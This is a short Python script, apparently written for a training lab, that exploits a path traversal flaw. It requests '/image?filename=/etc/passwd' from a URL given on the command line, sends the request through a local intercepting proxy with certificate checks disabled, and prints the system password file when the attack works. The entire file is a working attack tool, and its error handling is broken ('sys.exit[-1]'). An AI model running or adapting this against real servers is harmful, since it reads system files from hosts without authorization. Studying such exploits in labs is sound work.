import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.SecurityWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def path_traversal_exploit(url):
    url = url + '/image?filename=/etc/passwd'
    r = requests.get(url, verify=False,proxies=proxies)
#Confirm the success of the exploit
    if 'root:x' in r.text:
        print('[+] Exploit Succesful')
        print('[+] Here\'s the content of the etc/passwd file:')
        print(r.text)
    else:
        print('[-] Exploit unsuccesful')
        sys.exit[-1]

#function to print instrucitons if the program is incorrectly
def main():
    if len(sys.argv) != 2:
        print('[-] OOPS!')
        print('[+] Usage: %s <url>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit[-1]
#after running the program correctly
    url = sys.argv[1]
    print('[+] Exploiting the path traversal vulnerability')
    path_traversal_exploit(url)


if __name__ == "__main__":
    main()